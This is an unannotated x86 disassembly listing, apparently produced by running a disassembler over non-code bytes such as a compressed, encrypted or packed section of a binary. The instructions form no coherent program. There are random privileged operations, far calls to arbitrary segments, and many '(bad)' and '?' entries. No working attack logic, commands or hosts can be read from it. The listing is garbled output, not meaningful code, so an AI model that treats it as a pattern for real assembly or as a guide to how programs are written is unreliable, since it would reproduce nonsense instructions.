  41fce6:	push   ecx
  41fce7:	shr    BYTE PTR [ebx-0x26],1
  41fcea:	pop    eax
  41fceb:	push   edx
  41fcec:	mov    bl,0x77
  41fcee:	rcr    ebx,1
  41fcf0:	mov    ds:0x5fe5f062,eax
  41fcf5:	(bad)  
  41fcf6:	dec    ebp
  41fcf7:	rcr    cl,0xc8
  41fcfa:	cmp    ebp,ebp
  41fcfc:	mov    ecx,edx
  41fcfe:	or     eax,0x679f7b0a
  41fd03:	fs mov edx,edi
  41fd06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd08:	retf   0x3c55
  41fd0b:	mov    cl,0xa
  41fd0d:	push   esp
  41fd0e:	lea    edx,[eax]
  41fd10:	jge    0x41fd6f
  41fd12:	ss jb  0x41fd83
  41fd15:	out    dx,eax
  41fd16:	and    ebp,eax
  41fd18:	(bad)  
  41fd19:	aad    0x50
  41fd1b:	jmp    0x41fd20
  41fd1d:	mov    bl,0x4b
  41fd1f:	xchg   dl,dl
  41fd21:	ins    DWORD PTR es:[edi],dx
  41fd22:	mov    BYTE PTR [eax],ch
  41fd24:	out    0xcf,al
  41fd26:	iret   
  41fd27:	int    0x94
  41fd29:	aam    0xfe
  41fd2b:	fild   DWORD PTR [ebp-0x69230a32]
  41fd31:	xchg   edx,eax
  41fd32:	push   ebp
  41fd33:	dec    edi
  41fd34:	mov    cl,0xd
  41fd36:	mov    ah,0x93
  41fd38:	retf   
  41fd39:	shl    DWORD PTR [esi-0x59],cl
  41fd3c:	xchg   ecx,eax
  41fd3d:	in     al,0x63
  41fd3f:	rol    DWORD PTR [ebp-0x3b],0x71
  41fd43:	cld    
  41fd44:	jae    0x41fd96
  41fd46:	sbb    ebx,eax
  41fd48:	sti    
  41fd49:	sub    ebx,esi
  41fd4b:	int    0x43
  41fd4d:	fild   QWORD PTR [eax-0x6d]
  41fd50:	push   es
  41fd51:	fcomp  DWORD PTR [edx]
  41fd53:	(bad)  
  41fd54:	push   ebx
  41fd55:	pop    eax
  41fd56:	daa    
  41fd57:	les    ecx,FWORD PTR [ebx-0x19]
  41fd5a:	pusha  
  41fd5b:	aam    0xdb
  41fd5d:	adc    eax,0xbd874051
  41fd62:	or     ebp,DWORD PTR [ebp-0x1]
  41fd65:	mov    BYTE PTR ss:[esi+0x1c],ch
  41fd69:	push   ecx
  41fd6a:	fist   WORD PTR [edx]
  41fd6c:	sub    ebx,edx
  41fd6e:	cmc    
  41fd6f:	jo     0x41fdbb
  41fd71:	out    0x48,al
  41fd73:	call   0xf9f7:0xd8e92862
  41fd7a:	sti    
  41fd7b:	mov    ds:0x18d78e14,eax
  41fd80:	cwde   
  41fd81:	sbb    BYTE PTR [eax+0x5102b8b2],0x92
  41fd88:	push   ebp
  41fd89:	lahf   
  41fd8a:	add    ecx,DWORD PTR [esi]
  41fd8c:	shr    edx,cl
  41fd8e:	mov    dh,0x2d
  41fd90:	jmp    0x2a70de43
  41fd95:	jg     0x41fdb0
  41fd97:	and    edi,DWORD PTR [eax+0x6a]
  41fd9a:	fisttp DWORD PTR [ebp+ebx*2+0xc5d6a80]
  41fda1:	seto   BYTE PTR ds:0xa59e80e
  41fda8:	iret   
  41fda9:	shl    ecx,cl
  41fdab:	sbb    ecx,DWORD PTR [edi]
  41fdad:	adc    eax,0x289d1cdc
  41fdb2:	pop    esp
  41fdb3:	fyl2x  
  41fdb5:	sbb    al,0xb2
  41fdb7:	dec    eax
  41fdb8:	gs xchg esp,eax
  41fdba:	pop    ebp
  41fdbb:	ss (bad) 
  41fdbd:	outs   dx,DWORD PTR ds:[esi]
  41fdbe:	mov    al,ds:0xac8bf2d5
  41fdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc4:	push   ss
  41fdc5:	mov    eax,fs
  41fdc7:	lds    ebx,FWORD PTR [edx]
  41fdc9:	fsubr  st(6),st
  41fdcb:	cli    
  41fdcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdcd:	xor    al,BYTE PTR [ecx-0x6f]
  41fdd0:	imul   edx,DWORD PTR [ecx],0x7156fecc
  41fdd6:	mov    dl,0xd4
  41fdd8:	clc    
  41fdd9:	xchg   ecx,eax
  41fdda:	mov    esp,0x11d74dd9
  41fddf:	dec    esi
  41fde0:	jg     0x41fdc4
  41fde2:	stos   DWORD PTR es:[edi],eax
  41fde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fde4:	lahf   
  41fde5:	mov    ecx,0xc6a3b9de
  41fdea:	xchg   DWORD PTR [edx],ecx
  41fdec:	add    esp,DWORD PTR [edx-0x1bb726d6]
  41fdf2:	mov    ch,0xc6
  41fdf4:	xchg   esp,eax
  41fdf5:	push   eax
  41fdf6:	mov    edx,0xb0bd8258
  41fdfb:	jbe    0x41fdf9
  41fdfd:	pop    ebx
  41fdfe:	xor    ah,al
  41fe00:	mov    ebx,0xff14577a
  41fe05:	ror    BYTE PTR [esi-0x6d67d2db],0xbe
  41fe0c:	shr    BYTE PTR [ebp+edi*4-0x49c7958a],1
  41fe13:	add    al,0x11
  41fe15:	vmwrite esi,DWORD PTR [eax-0x2248fc34]
  41fe1c:	fs in  al,0xfa
  41fe1f:	gs xor bh,dh
  41fe22:	mov    dl,0x80
  41fe24:	sbb    DWORD PTR [esi+eiz*2-0x51],esp
  41fe28:	ret    
  41fe29:	push   eax
  41fe2a:	enter  0x8b21,0x7e
  41fe2e:	cmp    dl,BYTE PTR [ebp+ebp*8+0x37]
  41fe32:	mov    cl,0x1e
  41fe34:	fistp  QWORD PTR [eax+edx*8+0x37]
  41fe38:	push   ds
  41fe39:	fiadd  WORD PTR [edi-0x48b1c42e]
  41fe3f:	nop
  41fe40:	adc    eax,0xd0b66339
  41fe45:	xchg   esp,eax
  41fe46:	xor    dl,ah
  41fe48:	arpl   WORD PTR [ecx],bx
  41fe4a:	jae    0x41fe13
  41fe4c:	dec    edx
  41fe4d:	and    dl,BYTE PTR [esi]
  41fe4f:	add    edi,DWORD PTR [esi]
  41fe51:	cmp    al,0x83
  41fe53:	aam    0x3c
  41fe55:	aas    
  41fe56:	call   0x4c7c:0x8f21fbb
  41fe5d:	lock or ebx,DWORD PTR [ebx+0x4c]
  41fe61:	mov    dl,0xcc
  41fe63:	aas    
  41fe64:	pop    esi
  41fe65:	inc    ebx
  41fe66:	mov    edi,0x12db4eec
  41fe6b:	retf   0xcd38
  41fe6e:	out    0xdb,al
  41fe70:	ja     0x41fe9c
  41fe72:	jmp    0x6623:0xeb238ad4
  41fe79:	mov    al,0x6f
  41fe7b:	cmp    cl,dh
  41fe7d:	push   es
  41fe7e:	aas    
  41fe7f:	sub    dh,BYTE PTR [esp+edi*1-0x59]
  41fe83:	adc    bh,BYTE PTR [edx+0x262de8c5]
  41fe89:	in     al,0xe9
  41fe8b:	cmp    esi,ebp
  41fe8d:	aaa    
  41fe8e:	int    0xd3
  41fe90:	aam    0x94
  41fe92:	daa    
  41fe93:	arpl   si,si
  41fe95:	and    ebp,DWORD PTR [ecx+edi*1-0x3e9888a3]
  41fe9c:	xor    esp,DWORD PTR [ecx-0x2e]
  41fe9f:	or     ebx,DWORD PTR [edx]
  41fea1:	pop    ds
  41fea2:	and    BYTE PTR [ebp+0xce753f3],dl
  41fea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea9:	sbb    eax,0x90fc1b10
  41feae:	rcr    dl,cl
  41feb0:	xchg   esp,eax
  41feb1:	loopne 0x41fedf
  41feb3:	not    BYTE PTR [ecx+edx*2+0x7d]
  41feb7:	call   0x439c:0x5c18d121
  41febe:	popa   
  41febf:	and    DWORD PTR [esi+edi*8+0x2f],esp
  41fec3:	test   al,0x6d
  41fec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fec6:	adc    al,0x17
  41fec8:	push   0xffffffdd
  41feca:	addr16 mov esp,0xdcea523e
  41fed0:	xchg   DWORD PTR [ecx-0x29a81aa1],ebx
  41fed6:	sti    
  41fed7:	push   0x71c3a51a
  41fedc:	scas   al,BYTE PTR es:[edi]
  41fedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fede:	adc    BYTE PTR [esi+0x1b9d3f94],ah
  41fee4:	pop    es
  41fee5:	iret   
  41fee6:	mov    al,0x41
  41fee8:	or     eax,0xda3c0cea
  41feed:	dec    eax
  41feee:	clc    
  41feef:	jle    0x41fee3
  41fef1:	(bad)  
  41fef2:	xor    dl,cl
  41fef4:	add    BYTE PTR [edx+0xe3c7c98],al
  41fefa:	dec    esi
  41fefb:	sti    
  41fefc:	shl    BYTE PTR [edi-0x2c0dc8c4],1
  41ff02:	std    
  41ff03:	pop    ss
  41ff04:	lea    esp,[edi-0x4]
  41ff07:	or     cl,al
  41ff09:	outs   dx,DWORD PTR ds:[esi]
  41ff0a:	xchg   ebp,eax
  41ff0b:	jecxz  0x41ff47
  41ff0d:	inc    esp
  41ff0e:	push   cs
  41ff0f:	pop    es
  41ff10:	pop    ds
  41ff11:	push   0x2c2b6749
  41ff16:	adc    BYTE PTR [esi],al
  41ff18:	and    BYTE PTR [eax-0x34],bh
  41ff1b:	fist   DWORD PTR [eax+0x4b]
  41ff1e:	cld    
  41ff1f:	sub    al,0x9c
  41ff21:	pop    esi
  41ff22:	dec    edi
  41ff23:	sub    bh,BYTE PTR [edx]
  41ff25:	bound  eax,QWORD PTR [esi-0x4d782640]
  41ff2b:	out    dx,eax
  41ff2c:	(bad)  
  41ff2d:	sti    
  41ff2e:	sbb    dl,BYTE PTR [eax+0x48]
  41ff31:	fisttp QWORD PTR [ebx+0x3d]
  41ff34:	mov    ecx,ebx
  41ff36:	adc    ebx,edi
  41ff38:	jl     0x41ff8d
  41ff3a:	lods   eax,DWORD PTR ds:[esi]
  41ff3b:	mov    esi,0x2ef9c889
  41ff40:	ficom  WORD PTR [ebp-0xc]
  41ff43:	or     BYTE PTR [edx],bh
  41ff45:	jbe    0x41fef7
  41ff47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff48:	xchg   edx,eax
  41ff49:	clc    
  41ff4a:	pop    es
  41ff4b:	pop    ebx
  41ff4c:	dec    edx
  41ff4d:	ja     0x41ff49
  41ff4f:	and    dh,bl
  41ff51:	push   cs
  41ff52:	and    BYTE PTR [edi+edx*8-0x17d95a42],cl
  41ff59:	fild   DWORD PTR [ebx+0x1410f687]
  41ff5f:	xlat   BYTE PTR ds:[ebx]
  41ff60:	stc    
  41ff61:	cwde   
  41ff62:	cwde   
  41ff63:	pop    ecx
  41ff64:	xlat   BYTE PTR ds:[ebx]
  41ff65:	xchg   ecx,eax
  41ff66:	rcl    ch,0xb7
  41ff69:	shl    ch,0xb8
  41ff6c:	leave  
  41ff6d:	cmc    
  41ff6e:	(bad)  
  41ff6f:	mov    ebp,0x7b63e630
  41ff74:	ja     0x41ff2b
  41ff76:	and    ah,cl
  41ff78:	cwde   
  41ff79:	pop    esp
  41ff7a:	or     al,0x5d
  41ff7c:	repz repz mov bl,0x7
  41ff80:	dec    edi
  41ff81:	cmp    DWORD PTR [esp-0x660b1964],esi
  41ff88:	cwde   
  41ff89:	push   ss
  41ff8a:	int    0xbd
  41ff8c:	mov    esp,0x34826ed2
  41ff91:	jge    0x41ffdf
  41ff93:	ins    BYTE PTR es:[edi],dx
  41ff94:	add    edi,edi
  41ff96:	ds cmp eax,0xa3fb2c12
  41ff9c:	rcr    ch,0x58
  41ff9f:	sub    bh,ch
  41ffa1:	dec    esi
  41ffa2:	fcomp  DWORD PTR [eax-0x61]
  41ffa5:	mov    eax,0xb5715f89
  41ffaa:	mov    al,0x5b
  41ffac:	dec    ecx
  41ffad:	or     dl,BYTE PTR [edi+0x72]
  41ffb0:	ret    
  41ffb1:	or     al,BYTE PTR [eax+0x6f]
  41ffb4:	pop    ebp
  41ffb5:	jg     0x41ff3e
  41ffb7:	dec    eax
  41ffb8:	div    BYTE PTR [ecx+0x3b520bd6]
  41ffbe:	ins    DWORD PTR es:[edi],dx
  41ffbf:	lea    ecx,[ebx]
  41ffc1:	xchg   BYTE PTR [esi+ebx*8+0x5f],ah
  41ffc5:	pop    ebx
  41ffc6:	xchg   edi,eax
  41ffc7:	and    al,bh
  41ffc9:	mov    edi,0xbf1bcfe8
  41ffce:	jae    0x41ff75
  41ffd0:	jecxz  0x41fffa
  41ffd2:	jmp    0x78c411d3
  41ffd7:	clc    
  41ffd8:	cmp    al,0xdd
  41ffda:	scas   al,BYTE PTR es:[edi]
  41ffdb:	mov    ebx,0x691789fa
  41ffe0:	repnz pop esi
  41ffe2:	add    eax,0xb07b6845
  41ffe7:	fldcw  WORD PTR [eax+0x31]
  41ffea:	sub    cl,BYTE PTR [esi+0x3ebe0794]
  41fff0:	inc    esi
  41fff1:	test   BYTE PTR [esi+ebx*4+0x34],bl
  41fff5:	cwde   
  41fff6:	cli    
  41fff7:	mov    al,0xb3
  41fff9:	adc    ebp,edx
  41fffb:	das    
  41fffc:	adc    al,BYTE PTR [edx]
  41fffe:	or     BYTE PTR [esp+ecx*4+0x76acd26c],bl
  420005:	repnz pop ebx
  420007:	out    0x2b,eax
  420009:	cmp    eax,0x6ba9800a
  42000e:	push   esi
  42000f:	dec    eax
  420010:	pushf  
  420011:	inc    eax
  420012:	inc    eax
  420013:	mov    ch,0x5e
  420015:	push   edi
  420016:	pushf  
  420017:	push   esp
  420018:	or     al,0x61
  42001a:	ret    0xd6c6
  42001d:	rol    dh,1
  42001f:	dec    DWORD PTR [edx-0x51]
  420022:	fimul  WORD PTR [esi-0x11]
  420025:	mov    ebx,0xd7605626
  42002a:	lahf   
  42002b:	xor    eax,0x2f53e07d
  420030:	adc    al,0x9e
  420032:	pop    ss
  420033:	sub    al,0x22
  420035:	iret   
  420036:	jmp    0x42000e
  420038:	pop    esi
  420039:	aaa    
  42003a:	int3   
  42003b:	ins    BYTE PTR es:[edi],dx
  42003c:	mov    ch,0x64
  42003e:	push   edx
  42003f:	inc    DWORD PTR [edi+eax*8]
  420042:	loop   0x420033
  420044:	std    
  420045:	loop   0x42007b
  420047:	inc    esi
  420048:	sub    ecx,ebp
  42004a:	add    ah,BYTE PTR [ecx+0x1f]
  42004d:	out    0x43,eax
  42004f:	sub    cl,ch
  420051:	push   ebx
  420052:	dec    edi
  420053:	fld    QWORD PTR [ebp+0x2ab8d04e]
  420059:	sbb    eax,0x2b829db4
  42005e:	push   esi
  42005f:	out    0x6c,eax
  420061:	inc    eax
  420062:	nop
  420063:	jo     0x41ffeb
  420065:	scas   al,BYTE PTR es:[edi]
  420066:	pusha  
  420067:	push   eax
  420068:	int3   
  420069:	loope  0x4200e0
  42006b:	and    BYTE PTR [edi-0x6],al
  42006e:	aas    
  42006f:	xchg   ebx,eax
  420070:	jg     0x42001f
  420072:	xor    BYTE PTR [edx+0x3a],ch
  420075:	add    eax,0xd39539e0
  42007a:	mov    bh,0xc3
  42007c:	outs   dx,BYTE PTR ds:[esi]
  42007d:	into   
  42007e:	out    0x4c,al
  420080:	fadd   st,st(0)
  420082:	push   0xffffffbe
  420084:	jae    0x4200b5
  420086:	in     eax,0x7
  420088:	sub    eax,0x72b43664
  42008d:	das    
  42008e:	in     eax,0x49
  420090:	gs pop ecx
  420092:	add    BYTE PTR [eax+0x108da385],0x8b
  420099:	pop    es
  42009a:	dec    esp
  42009b:	aad    0x1e
  42009d:	mov    eax,ds:0x7b3bc433
  4200a2:	mov    DWORD PTR [edx+ecx*4+0x6a],ebx
  4200a6:	pop    esp
  4200a7:	cdq    
  4200a8:	mov    ebp,DWORD PTR [esi-0x121aad49]
  4200ae:	addr16 je 0x4200db
  4200b1:	push   0x32467822
  4200b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200b7:	gs xor cl,BYTE PTR cs:[edi]
  4200bb:	mov    eax,ds:0x9b76060
  4200c0:	jg     0x42009f
  4200c2:	dec    ebp
  4200c3:	or     esi,eax
  4200c5:	push   es
  4200c6:	and    al,0x1f
  4200c8:	inc    ebx
  4200c9:	lods   al,BYTE PTR ds:[esi]
  4200ca:	aaa    
  4200cb:	retf   0x235d
  4200ce:	mov    esp,0xf804f84e
  4200d3:	lds    ebp,FWORD PTR [edx]
  4200d5:	dec    ecx
  4200d6:	pop    es
  4200d7:	jbe    0x42005c
  4200d9:	stos   DWORD PTR es:[edi],eax
  4200da:	into   
  4200db:	(bad)  
  4200dc:	jle    0x4200de
  4200de:	in     eax,0xcf
  4200e0:	mov    ds:0x387602bb,eax
  4200e5:	aas    
  4200e6:	test   BYTE PTR [ebx+0x59a22b1d],ah
  4200ec:	je     0x420085
  4200ee:	jne    0x420136
  4200f0:	fs xchg edx,eax
  4200f2:	cmp    eax,0x657c6b65
  4200f7:	shld   DWORD PTR [eax-0x30d5ff96],ebp,0xa3
  4200ff:	mov    ah,0xe6
  420101:	fwait
  420102:	cmc    
  420103:	test   bh,al
  420105:	push   0xffffff9f
  420107:	data16 sub al,0x53
  42010a:	pushf  
  42010b:	bound  eax,QWORD PTR [edi]
  42010d:	cwde   
  42010e:	and    al,0xcd
  420110:	jmp    0xebdb2c74
  420115:	(bad)  
  420116:	aad    0xc9
  420118:	test   eax,0x4076fdd5
  42011d:	gs in  eax,dx
  42011f:	xchg   ecx,eax
  420120:	or     ebx,DWORD PTR [ebx]
  420122:	jb     0x4200b3
  420124:	ins    BYTE PTR es:[edi],dx
  420125:	cdq    
  420126:	sti    
  420127:	xchg   ebp,eax
  420128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420129:	shl    al,cl
  42012b:	fs or  eax,0x94ec43b6
  420131:	lea    edi,[eax-0x15cb1f0c]
  420137:	dec    edi
  420138:	mov    bh,BYTE PTR [eax+0x4]
  42013b:	or     BYTE PTR [eax-0x6d818dc9],dl
  420141:	test   eax,0xb45a1211
  420147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420148:	push   0x25
  42014a:	retf   0x59e
  42014d:	adc    BYTE PTR [ecx+0x1d51d690],bl
  420153:	xor    al,0xbe
  420155:	mov    gs,ebp
  420157:	sub    DWORD PTR [ecx+0x78],eax
  42015a:	dec    ebx
  42015b:	push   edi
  42015c:	(bad)  
  42015e:	add    eax,0xaf084fc3
  420163:	rol    BYTE PTR [esi+ecx*4-0x61],cl
  420167:	sar    DWORD PTR [ebp+eiz*1-0x10],cl
  42016b:	or     eax,0x8de26021
  420170:	fild   DWORD PTR [esi]
  420172:	add    DWORD PTR [ebx],0x9a7f4053
  420178:	sbb    eax,0x624c458f
  42017d:	xor    DWORD PTR [ebp-0x48],esp
  420180:	mov    al,BYTE PTR [ebx-0x51]
  420183:	mov    WORD PTR [edi-0x61208ad3],?
  420189:	mov    dl,0x96
  42018b:	loopne 0x4201ab
  42018d:	call   0xd4d087eb
  420192:	mov    BYTE PTR [ebp-0x2a],bh
  420195:	mov    ebx,0xe9d6b46f
  42019a:	iret   
  42019b:	adc    bh,BYTE PTR [esi]
  42019d:	cmp    bh,cl
  42019f:	and    ah,cl
  4201a1:	push   edi
  4201a2:	pop    es
  4201a3:	mov    al,0xef
  4201a5:	cli    
  4201a6:	bound  edi,QWORD PTR [eax-0x6260ecd3]
  4201ac:	pop    eax
  4201ad:	dec    ebp
  4201ae:	fiadd  DWORD PTR [ebx]
  4201b0:	sbb    BYTE PTR [edi+0x33a46089],bl
  4201b6:	ins    BYTE PTR es:[edi],dx
  4201b7:	daa    
  4201b8:	push   esi
  4201b9:	pop    ebp
  4201ba:	mov    edx,DWORD PTR ds:0x8fe50f78
  4201c0:	daa    
  4201c1:	xchg   DWORD PTR [esi-0x54],esi
  4201c4:	dec    esp
  4201c5:	stc    
  4201c6:	shl    DWORD PTR [esp+ebx*8-0x2879dc78],cl
  4201cd:	(bad)  
  4201ce:	mov    eax,ds:0xc62c0e53
  4201d3:	fisttp QWORD PTR [edx+0x36]
  4201d6:	call   0xa7cb4a1a
  4201db:	je     0x4201ae
  4201dd:	stos   DWORD PTR es:[edi],eax
  4201de:	cli    
  4201df:	mov    ecx,0x741119cd
  4201e4:	or     edi,DWORD PTR [ebx+ebp*2]
  4201e7:	sbb    ax,si
  4201ea:	mov    ch,0x1f
  4201ec:	push   edi
  4201ed:	leave  
  4201ee:	adc    DWORD PTR [ebx],ecx
  4201f0:	mov    eax,ds:0x17b99c6c
  4201f5:	fwait
  4201f6:	push   eax
  4201f7:	fiadd  DWORD PTR [ebx+0x3dea92ee]
  4201fd:	fisubr DWORD PTR ds:0x92df22bb
  420203:	mov    ah,0xf9
  420205:	out    0x5,eax
  420207:	addr16 loop 0x420282
  42020a:	js     0x420265
  42020c:	mov    dh,bl
  42020e:	and    eax,0xaca80fe7
  420213:	icebp  
  420214:	test   BYTE PTR [esi+eiz*8],ch
  420217:	jp     0x42025b
  420219:	mov    ecx,0xc8c99ba4
  42021e:	jg     0x420297
  420220:	sub    al,0xfe
  420222:	mov    al,0xda
  420224:	inc    ecx
  420225:	cmp    cl,BYTE PTR [edx-0x2989431f]
  42022b:	mov    eax,0xc6992755
  420230:	pop    edx
  420231:	iret   
  420232:	and    DWORD PTR [esi+0xc],edx
  420235:	or     al,0x3b
  420237:	push   esp
  420238:	add    edx,DWORD PTR [ebx]
  42023a:	call   0xf05c:0x5a0275df
  420241:	(bad)  [edi-0x60]
  420244:	popa   
  420245:	hlt    
  420246:	iret   
  420247:	popf   
  420248:	mov    eax,ds:0x56d91d62
  42024d:	mov    esi,0xbdd4129
  420252:	pop    ss
  420253:	pop    ecx
  420254:	mov    al,ds:0x8b97b2b3
  420259:	dec    edi
  42025a:	inc    ecx
  42025b:	shl    BYTE PTR [esi-0x4e],0x3c
  42025f:	dec    edi
  420260:	jp     0x420242
  420262:	cmp    BYTE PTR [edi],cl
  420264:	push   ss
  420265:	sbb    eax,0x6be3e206
  42026a:	sbb    DWORD PTR [ebp-0x580525c4],ebp
  420270:	popa   
  420271:	ret    0xe4e8
  420274:	je     0x42022c
  420276:	cld    
  420277:	outs   dx,BYTE PTR ds:[esi]
  420278:	pusha  
  420279:	cmp    esp,DWORD PTR [edi+0x6b317a53]
  42027f:	adc    esi,esi
  420281:	pop    ebx
  420282:	loopne 0x420225
  420284:	push   ebx
  420285:	cmp    DWORD PTR [edi],ebp
  420287:	mov    ecx,0xd7dbd088
  42028c:	das    
  42028d:	pop    edx
  42028e:	in     al,0xaf
  420290:	adc    cl,BYTE PTR [ebp-0x69]
  420293:	mov    edi,0x183a0782
  420298:	mov    bh,0x1e
  42029b:	jecxz  0x4202fd
  42029d:	outs   dx,BYTE PTR ds:[esi]
  42029e:	ins    DWORD PTR es:[edi],dx
  42029f:	cmp    eax,0xba7cf0fb
  4202a4:	test   al,0xb0
  4202a6:	int    0x9d
  4202a8:	aad    0x61
  4202aa:	push   0xc2a8ff12
  4202af:	popf   
  4202b0:	out    0x24,al
  4202b2:	pop    ss
  4202b3:	mov    ecx,0x36377759
  4202b8:	inc    edx
  4202b9:	fidivr WORD PTR [esi+0xf9c3f42]
  4202bf:	pop    esp
  4202c0:	repz add BYTE PTR [ebp-0xb],ch
  4202c4:	in     eax,0xee
  4202c6:	xor    DWORD PTR [edi],0xf78c0ddf
  4202cc:	inc    ecx
  4202cd:	mov    ebp,0xd9f8ba6d
  4202d2:	ficom  WORD PTR [ebx-0x63]
  4202d5:	mov    ds:0x3ac4d8cf,al
  4202da:	add    eax,0x98bb22ee
  4202df:	xchg   ecx,eax
  4202e0:	inc    ecx
  4202e1:	idiv   al
  4202e3:	int    0x7b
  4202e5:	push   esi
  4202e6:	mov    DWORD PTR [edi+0x58099411],0xf9caf747
  4202f0:	xchg   ch,bl
  4202f2:	cmp    eax,ebx
  4202f4:	sub    ecx,DWORD PTR [ecx]
  4202f6:	xor    bl,BYTE PTR ss:[edx]
  4202f9:	(bad)  
  4202fa:	and    eax,0xcdc552ad
  4202ff:	xchg   ecx,eax
  420300:	fs cmp eax,0x816b33ce
  420306:	sub    ch,BYTE PTR [ebx+edi*8-0x4d790ec7]
  42030d:	and    DWORD PTR [eax-0x52],esi
  420310:	mov    WORD PTR [edx],?
  420312:	dec    esi
  420313:	or     al,0xe
  420315:	or     esi,edi
  420317:	aaa    
  420318:	out    0x6,al
  42031a:	ins    BYTE PTR es:[edi],dx
  42031b:	in     al,dx
  42031c:	inc    ebx
  42031d:	js     0x420321
  42031f:	mov    edi,0xf9ee2340
  420324:	addr16 stc 
  420326:	xchg   edx,eax
  420327:	rol    BYTE PTR [edx],1
  420329:	add    DWORD PTR [ebx+0x522f88a4],0x4bfe794e
  420333:	push   esp
  420334:	sbb    esp,esi
  420336:	inc    esp
  420337:	sbb    BYTE PTR [esi+0x23],bl
  42033a:	push   eax
  42033b:	scas   al,BYTE PTR es:[edi]
  42033c:	sbb    eax,0x5066c1f1
  420341:	mov    bl,0xf5
  420343:	bound  eax,QWORD PTR [edi+ebx*1+0x3]
  420347:	pop    edi
  420348:	mov    cl,0x5d
  42034a:	push   0xfffffffb
  42034c:	inc    BYTE PTR [ebx-0x76]
  42034f:	sbb    ebx,edi
  420351:	push   ebp
  420352:	rcl    BYTE PTR [edx-0x79],0xb9
  420356:	push   edx
  420357:	int3   
  420358:	push   esi
  420359:	dec    edx
  42035a:	or     BYTE PTR [bp+0x8],0x57
  42035f:	imul   esp,DWORD PTR [edx+0x90f6919],0x6b
  420366:	ror    DWORD PTR [edx-0x7187faaa],cl
  42036c:	mov    ecx,0xf6530d13
  420371:	adc    eax,0x3e868724
  420376:	push   esp
  420377:	jns    0x420395
  420379:	and    ebp,DWORD PTR [eax]
  42037b:	addr16 pop eax
  42037d:	sub    bh,BYTE PTR [eax+edx*4]
  420380:	setl   BYTE PTR [ecx+0x27]
  420384:	sahf   
  420385:	push   esi
  420386:	xchg   edx,eax
  420387:	add    esp,DWORD PTR [esi-0x76]
  42038a:	loopne 0x42033e
  42038c:	jge    0x4203aa
  42038e:	cmp    eax,DWORD PTR [edi-0x37e4cad8]
  420394:	and    DWORD PTR [edi],esp
  420396:	ret    0xa7e8
  420399:	shl    bl,cl
  42039b:	fild   QWORD PTR [ebx+0x357c19c3]
  4203a1:	xor    bh,ah
  4203a3:	dec    esi
  4203a4:	retf   0x786a
  4203a7:	pop    esp
  4203a8:	dec    edx
  4203a9:	push   gs
  4203ab:	data16 das 
  4203ad:	sbb    eax,0x9a9320a5
  4203b2:	xor    al,BYTE PTR [edx+edx*4-0xf]
  4203b6:	add    DWORD PTR [ebx],esi
  4203b8:	lds    ecx,FWORD PTR [eax-0x5e4368d8]
  4203be:	dec    esi
  4203bf:	or     edx,esp
  4203c1:	inc    esp
  4203c2:	add    BYTE PTR [edi],0x1b
  4203c5:	leave  
  4203c6:	retf   
  4203c7:	retf   
  4203c8:	out    dx,eax
  4203c9:	pop    edx
  4203ca:	popw   ss
  4203cc:	push   es
  4203cd:	cmp    BYTE PTR [ecx-0x5eb5c0a0],dh
  4203d3:	daa    
  4203d4:	push   ss
  4203d5:	pop    ds
  4203d6:	retf   0x1c5e
  4203d9:	inc    eax
  4203da:	repz out 0x89,eax
  4203dd:	(bad)  
  4203df:	inc    edx
  4203e0:	in     al,0x9f
  4203e2:	jae    0x420439
  4203e4:	push   esi
  4203e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e6:	rcl    BYTE PTR [esi],cl
  4203e8:	out    0x76,al
  4203ea:	ins    BYTE PTR es:[edi],dx
  4203eb:	loop   0x4203bb
  4203ed:	nop
  4203ee:	dec    edx
  4203ef:	stc    
  4203f0:	stos   BYTE PTR es:[edi],al
  4203f1:	jle    0x42046f
  4203f3:	(bad)  
  4203f5:	pop    es
  4203f6:	pop    esp
  4203f7:	fistp  WORD PTR [ecx+0x2a]
  4203fa:	push   0xffffffa2
  4203fc:	out    dx,al
  4203fd:	xchg   BYTE PTR [ebp-0x56394e0],ah
  420403:	lea    ebp,[ebx]
  420405:	or     edi,DWORD PTR [ebx]
  420407:	cdq    
  420408:	or     BYTE PTR [esi],cl
  42040a:	dec    edx
  42040b:	dec    esi
  42040c:	lds    esp,FWORD PTR [ebp-0x60ee8cd2]
  420412:	jmp    0xd0d0:0xfa1a2f1
  420419:	xchg   edi,eax
  42041a:	or     bh,BYTE PTR [esi]
  42041c:	jae    0x42048b
  42041e:	int3   
  42041f:	mov    bl,0xfb
  420421:	out    0x9d,al
  420423:	adc    eax,0xeb933c86
  420428:	jle    0x42048d
  42042a:	pop    es
  42042b:	xor    dl,BYTE PTR [esi]
  42042d:	imul   DWORD PTR [edx-0x2d]
  420430:	fst    st(5)
  420432:	hlt    
  420433:	mov    eax,0x17d61735
  420438:	ror    BYTE PTR [eax],1
  42043a:	jnp    0x420428
  42043c:	cmp    bh,dh
  42043e:	adc    al,0x6f
  420440:	mov    edx,0x57cf5a49
  420445:	jne    0x420492
  420447:	pop    es
  420448:	or     ebx,DWORD PTR [ecx+0x36]
  42044b:	jbe    0x420491
  42044d:	inc    esp
  42044e:	test   BYTE PTR [edx-0x5a00955a],dh
  420454:	and    eax,0x8d71d275
  420459:	test   DWORD PTR [eax-0x26],0x22ef9058
  420460:	std    
  420461:	jne    0x420422
  420463:	aas    
  420464:	sbb    bl,ch
  420466:	(bad)  
  420467:	mov    ch,0x67
  420469:	cmc    
  42046a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046b:	sbb    eax,DWORD PTR [edi+0x5fd2066b]
  420471:	div    DWORD PTR ds:0xc40afa0e
  420477:	cmp    al,BYTE PTR [edi]
  420479:	cmp    ebp,ebp
  42047b:	inc    esi
  42047c:	inc    edi
  42047d:	jecxz  0x420425
  42047f:	mov    edx,0xda8ffbc1
  420484:	push   cs
